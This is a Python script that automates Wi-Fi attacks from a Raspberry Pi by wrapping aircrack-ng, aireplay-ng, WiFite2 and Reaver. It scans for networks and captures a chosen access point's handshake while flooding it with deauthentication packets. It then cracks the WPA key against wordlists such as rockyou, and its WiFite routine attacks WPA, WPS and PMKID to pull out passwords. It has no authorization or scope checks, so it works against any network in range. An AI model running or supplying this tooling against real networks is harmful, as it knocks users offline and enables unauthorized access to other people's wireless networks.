#!/usr/bin/env python3
"""
WiFi Security Tools Integration
Full integration of Aircrack-ng suite, WiFite2, Reaver, and other tools
Pi handles reconnaissance and capture, PC handles heavy cracking
"""

import subprocess
import time
import os
import signal
import json
import logging
from pathlib import Path
from datetime import datetime

logger = logging.getLogger(__name__)

class WiFiSecurityTools:
    def __init__(self, scan_iface="wlan0", mon_iface="wlan1"):
        self.scan_iface = scan_iface
        self.mon_iface = mon_iface
        self.cap_dir = Path("/home/jhye/captures")
        self.wordlist_dir = Path("/usr/share/wordlists")
        self.temp_dir = Path("/tmp/pistorm")
        
        # Ensure directories exist
        self.cap_dir.mkdir(parents=True, exist_ok=True)
        self.temp_dir.mkdir(parents=True, exist_ok=True)
        
        # Tool availability
        self.available_tools = self.check_tool_availability()
    
    def run_cmd(self, cmd, timeout=30, capture_output=True):
        """Execute command with proper error handling"""
        try:
            logger.info(f"Executing: {cmd}")
            result = subprocess.run(cmd, shell=True, capture_output=capture_output, 
                                  text=True, timeout=timeout)
            return result.returncode, result.stdout, result.stderr
        except subprocess.TimeoutExpired:
            logger.error(f"Command timeout: {cmd}")
            return -1, "", "timeout"
        except Exception as e:
            logger.error(f"Command error: {e}")
            return -1, "", str(e)
    
    def check_tool_availability(self):
        """Check which WiFi security tools are available"""
        tools = {
            "aircrack-ng": ["aircrack-ng", "--help"],
            "airodump-ng": ["airodump-ng", "--help"],
            "aireplay-ng": ["aireplay-ng", "--help"],
            "airbase-ng": ["airbase-ng", "--help"],
            "wifite": ["wifite", "--help"],
            "reaver": ["reaver", "--help"],
            "pixiewps": ["pixiewps", "--help"],
            "kismet": ["kismet", "--version"],
            "tcpdump": ["tcpdump", "--version"],
            "tshark": ["tshark", "--version"],
            "iwconfig": ["iwconfig", "--version"],
            "iw": ["iw", "--version"]
        }
        
        available = {}
        for tool, test_cmd in tools.items():
            try:
                rc, out, err = self.run_cmd(" ".join(test_cmd), timeout=5)
                available[tool] = rc == 0 or "not found" not in err.lower()
                if available[tool]:
                    logger.info(f"✅ {tool} available")
                else:
                    logger.warning(f"⚠️ {tool} not available")
            except:
                available[tool] = False
                logger.warning(f"❌ {tool} not found")
        
        return available
    
    def setup_monitor_mode_robust(self):
        """Robust monitor mode setup using aircrack-ng best practices"""
        logger.info("🔧 Setting up monitor mode using aircrack-ng suite...")
        
        # Step 1: Kill interfering processes using airmon-ng
        if self.available_tools.get("aircrack-ng"):
            logger.info("🔪 Using airmon-ng to kill interfering processes...")
            self.run_cmd("sudo airmon-ng check kill", timeout=15)
            time.sleep(2)
        
        # Step 2: Stop NetworkManager manually if needed
        logger.info("🛑 Stopping NetworkManager and wpa_supplicant...")
        stop_commands = [
            "sudo systemctl stop NetworkManager",
            "sudo systemctl stop wpa_supplicant", 
            "sudo pkill -f NetworkManager",
            "sudo pkill -f wpa_supplicant"
        ]
        
        for cmd in stop_commands:
            self.run_cmd(cmd, timeout=10)
            time.sleep(0.5)
        
        # Step 3: Use airmon-ng to start monitor mode (recommended method)
        if self.available_tools.get("aircrack-ng"):
            logger.info(f"📡 Starting monitor mode on {self.mon_iface} using airmon-ng...")
            
            # First check if interface exists
            rc, out, err = self.run_cmd(f"iwconfig {self.mon_iface}")
            if rc != 0:
                logger.error(f"Interface {self.mon_iface} not found!")
                return False
            
            # Use airmon-ng to start monitor mode
            rc, out, err = self.run_cmd(f"sudo airmon-ng start {self.mon_iface}")
            
            if rc == 0:
                # airmon-ng might create wlan1mon or similar
                monitor_interfaces = ["wlan1mon", "mon0", self.mon_iface]
                
                for test_iface in monitor_interfaces:
                    rc_test, out_test, _ = self.run_cmd(f"iwconfig {test_iface}")
                    if rc_test == 0 and "Mode:Monitor" in out_test:
                        self.mon_iface = test_iface
                        logger.info(f"✅ Monitor mode active on {self.mon_iface}")
                        return True
        
        # Fallback: Manual monitor mode setup
        logger.info("🔄 Fallback: Manual monitor mode setup...")
        return self.setup_monitor_manual()
    
    def setup_monitor_manual(self):
        """Manual monitor mode setup if airmon-ng fails"""
        logger.info(f"🔧 Manual monitor mode setup for {self.mon_iface}...")
        
        commands = [
            f"sudo ip link set {self.mon_iface} down",
            f"sudo iw dev {self.mon_iface} set type monitor",
            f"sudo ip link set {self.mon_iface} up"
        ]
        
        for cmd in commands:
            rc, out, err = self.run_cmd(cmd)
            if rc != 0:
                logger.error(f"Manual setup failed: {cmd} - {err}")
                return False
            time.sleep(1)
        
        # Verify monitor mode
        rc, out, err = self.run_cmd(f"iwconfig {self.mon_iface}")
        if rc == 0 and "Mode:Monitor" in out:
            logger.info("✅ Manual monitor mode setup successful")
            return True
        else:
            logger.error("❌ Manual monitor mode setup failed")
            return False
    
    def scan_networks_airodump(self, duration=10):
        """Scan for networks using airodump-ng"""
        if not self.available_tools.get("airodump-ng"):
            logger.error("airodump-ng not available")
            return []
        
        logger.info(f"📡 Scanning networks with airodump-ng for {duration} seconds...")
        
        # Ensure monitor mode
        if not self.setup_monitor_mode_robust():
            logger.error("Failed to setup monitor mode")
            return []
        
        # Scan with airodump-ng
        scan_file = self.temp_dir / f"scan_{int(time.time())}"
        cmd = f"timeout {duration} sudo airodump-ng -w {scan_file} --output-format csv {self.mon_iface}"
        
        rc, out, err = self.run_cmd(cmd, timeout=duration + 5)
        
        # Parse CSV results
        csv_file = f"{scan_file}-01.csv"
        networks = []
        
        if os.path.exists(csv_file):
            try:
                with open(csv_file, 'r') as f:
                    lines = f.readlines()
                
                # Find the AP section
                in_ap_section = False
                for line in lines:
                    if line.strip() == "BSSID, First time seen, Last time seen, channel, Speed, Privacy, Cipher, Authentication, Power, # beacons, # IV, LAN IP, ID-length, ESSID, Key":
                        in_ap_section = True
                        continue
                    
                    if in_ap_section and line.strip() and not line.startswith("Station MAC"):
                        parts = [p.strip() for p in line.split(',')]
                        if len(parts) >= 14:
                            networks.append({
                                "bssid": parts[0],
                                "channel": parts[3],
                                "privacy": parts[5],
                                "cipher": parts[6],
                                "authentication": parts[7], 
                                "power": parts[8],
                                "essid": parts[13] if parts[13] else "<hidden>"
                            })
                
                # Clean up
                for ext in [".csv", ".cap", ".kismet.csv", ".kismet.netxml"]:
                    try:
                        os.remove(f"{scan_file}-01{ext}")
                    except:
                        pass
                        
            except Exception as e:
                logger.error(f"Error parsing airodump results: {e}")
        
        logger.info(f"Found {len(networks)} networks")
        return networks
    
    def capture_handshake_airodump(self, target_bssid, target_channel, duration=60):
        """Capture handshake using airodump-ng"""
        if not self.available_tools.get("airodump-ng"):
            logger.error("airodump-ng not available")
            return None
        
        logger.info(f"🎯 Capturing handshake for {target_bssid} on channel {target_channel}")
        
        # Ensure monitor mode
        if not self.setup_monitor_mode_robust():
            logger.error("Failed to setup monitor mode")
            return None
        
        # Set channel
        self.run_cmd(f"sudo iwconfig {self.mon_iface} channel {target_channel}")
        time.sleep(1)
        
        # Start capture
        cap_file = self.cap_dir / f"handshake_{target_bssid.replace(':', '')}_{int(time.time())}"
        cmd = f"timeout {duration} sudo airodump-ng -c {target_channel} --bssid {target_bssid} -w {cap_file} {self.mon_iface}"
        
        # Run capture in background
        logger.info(f"Starting handshake capture...")
        proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        # Wait a bit, then start deauth attacks
        time.sleep(5)
        
        if self.available_tools.get("aireplay-ng"):
            logger.info("🚀 Starting deauthentication attacks...")
            deauth_cmd = f"sudo aireplay-ng -0 5 -a {target_bssid} {self.mon_iface}"
            
            # Multiple deauth rounds
            for round_num in range(3):
                logger.info(f"Deauth round {round_num + 1}/3")
                self.run_cmd(deauth_cmd, timeout=10)
                time.sleep(5)
        
        # Wait for capture to complete
        proc.wait()
        
        # Check for captured files
        cap_files = [
            f"{cap_file}-01.cap",
            f"{cap_file}.cap"
        ]
        
        for cap_path in cap_files:
            if os.path.exists(cap_path) and os.path.getsize(cap_path) > 1000:
                logger.info(f"✅ Handshake capture completed: {cap_path}")
                return cap_path
        
        logger.warning("⚠️ No significant handshake data captured")
        return None
    
    def analyze_handshake_aircrack(self, cap_file):
        """Analyze handshake file using aircrack-ng"""
        if not self.available_tools.get("aircrack-ng"):
            logger.error("aircrack-ng not available")
            return False
        
        logger.info(f"🔍 Analyzing handshake in {cap_file}")
        
        # Use aircrack-ng to check for handshake
        cmd = f"aircrack-ng {cap_file}"
        rc, out, err = self.run_cmd(cmd, timeout=30)
        
        # Look for handshake indicators
        handshake_found = False
        if "1 handshake" in out.lower() or "handshake" in out.lower():
            handshake_found = True
            logger.info("✅ Handshake detected by aircrack-ng")
        else:
            logger.warning("⚠️ No handshake detected by aircrack-ng")
        
        return handshake_found
    
    def crack_wpa_locally(self, cap_file, wordlist_path=None, test_mode=False):
        """Light WPA cracking on Pi (for testing) - Heavy work goes to GPU PC"""
        if not self.available_tools.get("aircrack-ng"):
            logger.error("aircrack-ng not available")
            return None
        
        if not wordlist_path:
            # Look for common wordlists
            common_wordlists = [
                "/usr/share/wordlists/rockyou.txt",
                "/usr/share/wordlists/fasttrack.txt", 
                "/usr/share/dict/words"
            ]
            
            for wl in common_wordlists:
                if os.path.exists(wl):
                    wordlist_path = wl
                    break
        
        if not wordlist_path or not os.path.exists(wordlist_path):
            logger.error("No wordlist available for local cracking")
            return None
        
        logger.info(f"🔓 Testing local crack on Pi (lightweight)")
        logger.info(f"Wordlist: {wordlist_path}")
        
        # Limit to first 1000 passwords for Pi testing
        test_wordlist = "/tmp/test_wordlist.txt"
        if test_mode:
            self.run_cmd(f"head -1000 {wordlist_path} > {test_wordlist}")
            wordlist_path = test_wordlist
        
        cmd = f"timeout 30 aircrack-ng -w {wordlist_path} {cap_file}"
        rc, out, err = self.run_cmd(cmd, timeout=35)
        
        # Parse result
        if "KEY FOUND!" in out:
            # Extract password
            lines = out.split('\n')
            for line in lines:
                if "KEY FOUND!" in line:
                    password = line.split('[')[1].split(']')[0].strip()
                    logger.info(f"🎉 Password found: {password}")
                    return password
        
        logger.info("🔄 No password found in lightweight test - GPU processing recommended")
        return None
    
    def run_wifite(self, target_essid=None, attack_time=300):
        """Run automated WiFite2 attack"""
        if not self.available_tools.get("wifite"):
            logger.error("WiFite2 not available")
            return None
        
        logger.info("🤖 Running automated WiFite2 attack...")
        
        # Build WiFite command
        cmd = f"sudo wifite --kill --timeout {attack_time}"
        
        if target_essid:
            cmd += f" --essid {target_essid}"
        
        # Add various attack options
        cmd += " --wpa --wps --pmkid"
        
        logger.info(f"Executing: {cmd}")
        rc, out, err = self.run_cmd(cmd, timeout=attack_time + 60)
        
        # Parse WiFite results
        results = {
            "success": False,
            "passwords_found": [],
            "targets_attacked": 0,
            "output": out
        }
        
        # Look for successful cracks
        if "WPA Key:" in out:
            lines = out.split('\n')
            for line in lines:
                if "WPA Key:" in line:
                    password = line.split("WPA Key:")[1].strip()
                    results["passwords_found"].append(password)
                    results["success"] = True
        
        return results
    
    def test_all_tools(self):
        """Test all available WiFi security tools"""
        logger.info("🧪 Testing all WiFi security tools...")
        
        test_results = {}
        
        # Test monitor mode
        monitor_result = self.setup_monitor_mode_robust()
        test_results["monitor_mode"] = monitor_result
        
        # Test scanning
        if monitor_result:
            networks = self.scan_networks_airodump(duration=5)
            test_results["network_scan"] = len(networks) > 0
            test_results["networks_found"] = len(networks)
        else:
            test_results["network_scan"] = False
            test_results["networks_found"] = 0
        
        # Test tool availability
        test_results["tools"] = self.available_tools
        
        # Calculate overall health
        critical_tools = ["aircrack-ng", "airodump-ng", "aireplay-ng"]
        critical_available = sum(1 for tool in critical_tools if self.available_tools.get(tool, False))
        test_results["tool_health"] = f"{critical_available}/{len(critical_tools)} critical tools available"
        
        return test_results

def main():
    """Test the WiFi security tools integration"""
    logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
    
    tools = WiFiSecurityTools()
    
    print("🚀 PiStorm WiFi Security Tools Integration Test")
    print("=" * 60)
    
    results = tools.test_all_tools()
    
    print("\n📊 Test Results:")
    print("=" * 30)
    
    for key, value in results.items():
        if key == "tools":
            print(f"🛠️ Tool Availability:")
            for tool, available in value.items():
                status = "✅" if available else "❌"
                print(f"   {status} {tool}")
        else:
            print(f"📋 {key}: {value}")
    
    print("\n" + "=" * 60)
    if results.get("monitor_mode") and results.get("network_scan"):
        print("🎉 WiFi security tools are ready for operation!")
    else:
        print("⚠️ Some issues detected - check tool installation and permissions")

if __name__ == "__main__":
    main()